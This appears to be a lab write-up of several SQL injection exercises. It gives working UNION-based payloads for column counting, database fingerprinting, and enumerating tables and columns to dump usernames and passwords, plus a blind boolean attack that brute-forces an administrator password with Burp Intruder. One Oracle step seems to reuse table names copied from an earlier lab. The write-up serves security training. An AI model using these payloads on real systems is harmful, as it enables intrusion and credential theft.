**Step 1**

Checking number of columns. As done in previous lab

**Step 2**

Inserting string to find a column that support String injection.

Now trying in second column

And we found the column

**Step3**

Now we don’t know which database is this so first we uses this query

`' UNION SELECT username || '~' || password FROM users--`

This is use to insert username and password concatenated in oracle database.

Modify the query to

`' UNION SELECT NULL,username || '~' || password FROM users--`

The result show this is an oracle database. And the query executed successfully

**Step4:**

Search for administrator in response

Now login with give credential. And lab will be solve.

**Step1**

Check number of column

**Step2**

Check in which column we can insert

Here we are able to insert in both column

**Step3**

Now we use this payload

`' UNION SELECT @@version--`

Modify query to

`' UNION SELECT @@version,NULL#`

Or

`' UNION SELECT NULL,@@version#`

Encode it to URL

And we have the answer

**Step 1:**

Click on any catrgories

Send this request to repeater

**Step2**

First we check number of column

Here we have 2 column

**Step3**

Checking in which we can insert query

We can insert query in both column

**Step4**

Listing all availble tabel using

`SELECT * FROM information_schema.tables`

Modify query to

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

Here is the response of query, we have a table

**Step5**

We will get knowledge of column

Query

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_lctwqx'--`

In response we can see column name for username and password

**Step 6**

`' UNION SELECT username_qgkbjp, password_qrfngy FROM users_lctwqx--`

Using this query to extract all username and password

Now login with this credential and lab will be solve.

**Step 1:**

Click on any catrgories

**Step2:**

Send this request to repeater

**Step3**

Check number of column

Using:`'UNION SELECT NULL,NULL FROM DUAL--`

Now check point of insertion

`'UNION SELECT 'a','a' FROM DUAL--`

So we can insert in both column

**Step4**

To list all content we use

`SELECT * FROM all_tables`

Modify query to

`'+UNION+SELECT+table_name,+NULL+FROM+all_tables--`

In response we can see table users_mcujaa

**Step5**

We will get knowledge of column

Query

`' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_MCUJAA' --`

In response we have two column

RESPONSE

**Step 6**

`' UNION SELECT username_qgkbjp, password_qrfngy FROM users_lctwqx--`

Using this query to extract all username and password

**Step1**

Click on any categories

**Step2**

Sending request to repeater

**Step3**

Checking where welcome back message is shown by using the true condition and then using false condition
```
…xyz' AND '1'='1  
…xyz' AND '1'='2
```

Response

Now check using false condition

Response

As it is clear that we can inject query because there is a point of injection

**Step 4**

Now we know

Table:user

Column :username and password.

So first we extract first letter of password using

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

If result is welcome back then we say that first letter correct

For this we use intruder

We select 't and apply a payload

The attack type is snipper

This is payload setting

Now we have extracted password for our first character which is 1

Because the length is different from other

And if I use

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='1`

In repeater the response contain welcome message.

**Step5**

Now we find password for all index. To do it fast we use cluster bomb attack by selecting both index and charater

Payload setting

Payload 2

Apply filter welcome and we will have character that having response welcome with their corresponding indexes.

1 6 8 o y c 4 s k s g 4 w c l 3 7 5 0 w

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20

**Password:168oyc4sksg4wcl3750w**
